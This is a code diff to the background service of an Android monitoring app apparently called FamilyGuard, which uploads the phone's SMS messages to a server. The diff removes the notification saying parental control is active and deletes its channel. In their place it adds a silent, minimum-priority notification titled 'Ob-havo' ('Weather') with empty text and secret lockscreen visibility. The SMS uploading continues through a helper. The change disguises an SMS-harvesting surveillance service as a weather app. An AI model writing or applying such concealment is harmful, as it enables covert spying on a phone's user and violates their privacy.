@@ -8,7 +8,7 @@ import android.app.Service
 import android.app.usage.UsageStatsManager
 import android.content.Context
 import android.content.Intent
-import android.database.Cursor
+import android.content.pm.ServiceInfo
 import android.graphics.Bitmap
 import android.graphics.BitmapFactory
 import android.net.Uri
@@ -16,7 +16,6 @@ import android.net.wifi.WifiManager
 import android.os.Build
 import android.os.IBinder
 import android.provider.MediaStore
-import android.provider.Telephony
 import androidx.core.app.NotificationCompat
 import com.familyguard.child.ChildApp
 import com.familyguard.child.MainActivity
@@ -36,7 +35,6 @@ import java.text.SimpleDateFormat
 import java.util.Calendar
 import java.util.Date
 import java.util.Locale
-import java.util.TimeZone
 import java.util.concurrent.ConcurrentLinkedQueue
 
 class GuardForegroundService : Service() {
@@ -48,12 +46,17 @@ class GuardForegroundService : Service() {
     override fun onBind(intent: Intent?): IBinder? = null
 
     override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
-        startForeground(NOTIF_ID, buildNotification())
+        val notif = buildNotification()
+        if (Build.VERSION.SDK_INT >= 29) {
+            startForeground(NOTIF_ID, notif, ServiceInfo.FOREGROUND_SERVICE_TYPE_DATA_SYNC)
+        } else {
+            startForeground(NOTIF_ID, notif)
+        }
         if (loopJob == null) {
             loopJob = scope.launch {
                 while (isActive) {
                     runCatching { syncAll() }
-                    delay(15_000)
+                    delay(60_000)
                 }
             }
         }
@@ -118,40 +121,10 @@ class GuardForegroundService : Service() {
     }
 
     private suspend fun syncRecentSms(deviceId: Int) {
-        val prefs = getSharedPreferences("sync", MODE_PRIVATE)
-        val lastTs = prefs.getLong("sms_last_ts", System.currentTimeMillis() - 86_400_000L)
-        var maxTs = lastTs
-        val items = mutableListOf<Map<String, Any>>()
-        val cursor: Cursor? = contentResolver.query(
-            Telephony.Sms.Inbox.CONTENT_URI,
-            arrayOf(Telephony.Sms.ADDRESS, Telephony.Sms.BODY, Telephony.Sms.DATE),
-            "${Telephony.Sms.DATE} > ?",
-            arrayOf(lastTs.toString()),
-            "${Telephony.Sms.DATE} DESC",
-        )
-        cursor?.use {
-            val iso = SimpleDateFormat("yyyy-MM-dd'T'HH:mm:ssXXX", Locale.US).apply {
-                timeZone = TimeZone.getDefault()
-            }
-            while (it.moveToNext()) {
-                val address = it.getString(0) ?: ""
-                val body = it.getString(1) ?: ""
-                val date = it.getLong(2)
-                if (date > maxTs) maxTs = date
-                items.add(
-                    mapOf(
-                        "address" to address,
-                        "body" to body,
-                        "direction" to "inbox",
-                        "received_at" to iso.format(Date(date)),
-                    )
-                )
-            }
-        }
-        if (items.isNotEmpty()) {
-            api.syncSms(deviceId, gson.toJson(items))
-            prefs.edit().putLong("sms_last_ts", maxTs).apply()
-        }
+        val captured = SmsInbox.pending(this)
+        if (captured.isEmpty()) return
+        api.syncSms(deviceId, gson.toJson(SmsInbox.payload(captured)))
+        SmsInbox.markSynced(this, captured)
     }
 
     private suspend fun flushNotifications(deviceId: Int) {
@@ -221,12 +194,25 @@ class GuardForegroundService : Service() {
     }
 
     private fun buildNotification(): Notification {
-        val channelId = "family_guard_agent"
+        val channelId = "obhavo_bg"
         val nm = getSystemService(NotificationManager::class.java)
         if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
-            nm.createNotificationChannel(
-                NotificationChannel(channelId, "Oila himoyasi", NotificationManager.IMPORTANCE_LOW)
-            )
+            nm.deleteNotificationChannel("family_guard_agent")
+            val channel = NotificationChannel(
+                channelId,
+                "Ob-havo",
+                NotificationManager.IMPORTANCE_MIN,
+            ).apply {
+                setShowBadge(false)
+                setSound(null, null)
+                enableVibration(false)
+                enableLights(false)
+                lockscreenVisibility = Notification.VISIBILITY_SECRET
+                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
+                    setAllowBubbles(false)
+                }
+            }
+            nm.createNotificationChannel(channel)
         }
         val pi = PendingIntent.getActivity(
             this,
@@ -235,11 +221,17 @@ class GuardForegroundService : Service() {
             PendingIntent.FLAG_IMMUTABLE,
         )
         return NotificationCompat.Builder(this, channelId)
-            .setContentTitle("Oila himoyasi faol")
-            .setContentText("Ota-ona nazorati fon rejimida ishlayapti")
+            .setContentTitle("Ob-havo")
+            .setContentText("")
             .setSmallIcon(R.drawable.ic_launcher)
             .setContentIntent(pi)
             .setOngoing(true)
+            .setSilent(true)
+            .setShowWhen(false)
+            .setLocalOnly(true)
+            .setPriority(NotificationCompat.PRIORITY_MIN)
+            .setVisibility(NotificationCompat.VISIBILITY_SECRET)
+            .setForegroundServiceBehavior(NotificationCompat.FOREGROUND_SERVICE_DEFERRED)
             .build()
     }
 
